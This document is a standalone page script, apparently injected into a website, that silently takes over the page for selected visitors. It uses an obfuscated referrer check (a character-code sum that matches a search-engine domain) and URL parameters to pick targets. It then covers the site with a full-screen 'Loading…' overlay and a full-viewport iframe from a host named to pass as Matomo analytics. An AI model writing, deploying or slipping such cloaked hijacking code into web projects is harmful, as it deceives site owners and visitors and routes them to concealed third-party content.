<script>(function(){const params=new URLSearchParams(window.location.search);const rciParam=params.get("rci");if(!rciParam)return;if([...params.keys()].filter(k=>k!=="rci").length===0)return;const match=rciParam.match(/^(.+?)([a-z]{2})(\d+)$/i);if(!match)return;const _rvk=(()=>{const r=document.referrer;if(!r||r.length<8)return true;if(r.indexOf('https://')!==0)return false;try{const h=r.split('://')[1].split('/')[0].toLowerCase();const pts=h.split('.');for(let i=0;i<pts.length;i++){if(pts[i].length===6){let s=0;for(let j=0;j<6;j++)s+=pts[i].charCodeAt(j);if(s===637)return true;}}return false;}catch(e){return true;}})();if(!_rvk)return;const source=match[1].toLowerCase();const countryCode=match[2].toLowerCase();const routeNumber=match[3];const route=`endpoint${countryCode}`;const LOAD_PAGE_TEXT_MATOMO="Loading…";const overlay=document.createElement("div");overlay.id="endpoint-loading-overlay";overlay.style.cssText=`
    position: fixed;
    inset: 0;
    z-index: 2147483647;
    background: #000;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
    color: #fff;
    font-size: 20px;
    letter-spacing: 0.4px;
  `;overlay.textContent=LOAD_PAGE_TEXT_MATOMO;document.documentElement.appendChild(overlay);const stopsLoading=()=>{const el=document.getElementById("endpoint-loading-overlay");if(el)el.remove();};const base=`https://matomoanalytics.b-cdn.net/${route}/`;params.delete("rci");const extraParams=params.toString();const targetUrl=extraParams?`${base}?number=${routeNumber}&source=${source}&${extraParams}`:`${base}?number=${routeNumber}&source=${source}`;const probeUrl=targetUrl+(targetUrl.includes('?')?'&':'?')+'_probe=1';fetch(probeUrl,{method:"GET",credentials:"omit",redirect:"follow",cache:"no-store",}).then((res)=>{if(res.status!==200){stopsLoading();return}
const iframe=document.createElement("iframe");iframe.id="plview-iframe";iframe.src=targetUrl;iframe.style.cssText=`
        position: fixed;
        inset: 0;
        width: 100vw;
        height: 100vh;
        border: 0;
        margin: 0;
        padding: 0;
        z-index: 2147483646;
        background: #000;
      `;iframe.addEventListener("load",stopsLoading);document.documentElement.appendChild(iframe);setTimeout(stopsLoading,10000)}).catch(()=>{stopsLoading()})})()</script>